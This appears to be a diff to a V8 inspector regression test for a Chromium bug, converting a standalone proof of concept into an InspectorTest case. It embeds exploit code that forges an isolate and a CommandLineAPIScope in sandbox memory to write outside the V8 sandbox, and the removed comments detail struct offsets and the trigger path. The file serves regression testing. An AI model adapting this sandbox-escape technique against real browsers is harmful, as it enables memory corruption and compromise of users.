@@ -2,14 +2,13 @@
 // Use of this source code is governed by a BSD-style license that can be
 // found in the LICENSE file.
 
-// Flags: --enable-inspector --sandbox-testing
+// Flags: --sandbox-testing
 
-globalThis.receive = function(message) {
-  print(message);
-};
+const {session, contextGroup, Protocol} =
+    InspectorTest.start('Regression test for crbug.com/507490539');
 
 const expression = String.raw`
-const print = (...args) => console.log(...args);
+const print = (...args) => {};
 const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 
 function r32(addr) {
@@ -151,16 +150,16 @@ function chooseUnmappedTarget() {
   throw new Error("could not choose an out-of-sandbox target");
 }
 
+for (let i = 0; i < 200; i++) {
+  findCommandLineAccessorInfo("$0");
+}
 const {accessorInfo, nameTagged, key} = findCommandLineAccessorInfo("$0");
 
-// Real FixedArray ["$0"] used by accessorSetterCallback's installed-methods
-// loop. The first element must StrictEquals the accessor name.
 const methodsCarrier = [key];
 const methodsElements = findArrayElements(
     methodsCarrier, ({length, first}) => length > 0 && first === nameTagged);
+isTaggedHeapObject((methodsElements.offset + 8) | 1);
 
-// A large in-sandbox FixedArray gives us stable writable bytes for fake C++
-// objects and fake native handle slots.
 const holder = {};
 const arenaCarrier = new Array(512).fill(holder);
 const arenaElements = findArrayElements(
@@ -173,27 +172,11 @@ const methodsGlobalSlot = (arena + 0x380) >>> 0;
 const fakeData = new ArrayBuffer(8);
 const target = chooseUnmappedTarget();
 
-// A v8::Global<T> stores a native pointer to a slot containing the full tagged
-// object address. Put a fake persistent slot inside sandbox memory.
 w64(methodsGlobalSlot, full(methodsElements.tagged));
 
-// CommandLineAPIScope layout on this x64 build:
-//   +0x00 v8::Isolate* m_isolate
-//   +0x08 Global<Context> m_context
-//   +0x10 Global<Object> m_commandLineAPI
-//   +0x18 Global<Object> m_global
-//   +0x20 Global<PrimitiveArray> m_installedMethods
-//   +0x28 Global<ArrayBuffer> m_thisReference
 w64(fakeScope + 0x00, full(fakeIsolate));
 w64(fakeScope + 0x20, full(methodsGlobalSlot));
 
-// Isolate::isolate_data_.handle_scope_data_ offsets in this x64 release build:
-//   +0x230 Address* next
-//   +0x238 Address* limit
-//
-// Local handle creation will read next/limit from the fake isolate, update
-// next in sandbox memory, then perform *next = value at the out-of-sandbox
-// target below. This makes the crash a real write violation.
 w64(fakeIsolate + 0x230, target);
 w64(fakeIsolate + 0x238, target + 0x100n);
 
@@ -208,26 +191,15 @@ print("fakeScope=" + hex64(full(fakeScope)));
 print("fakeIsolate=" + hex64(full(fakeIsolate)));
 print("target=" + hex64(target));
 
-// AccessorInfo layout in this pointer-compressed build:
-//   +0 map
-//   +4 data
-//   +8 name
-//   +12 getter external-pointer handle
-//   +16 setter external-pointer handle
-//   +20 flags
 w32(accessorInfo + 4, (raw(fakeData) + 1) >>> 0);
 
-// Trigger V8Console::CommandLineAPIScope::accessorSetterCallback. The forged
-// scope survives through installedMethods(), then Local::New creates an API
-// handle through the forged isolate's HandleScopeData and writes to target.
 globalThis.$0 = 13;
 `;
 
-send(JSON.stringify({
-  id: 1,
-  method: 'Runtime.evaluate',
-  params: {
+(async () => {
+  await Protocol.Runtime.evaluate({
     includeCommandLineAPI: true,
     expression,
-  },
-}));
+  });
+  InspectorTest.completeTest();
+})();
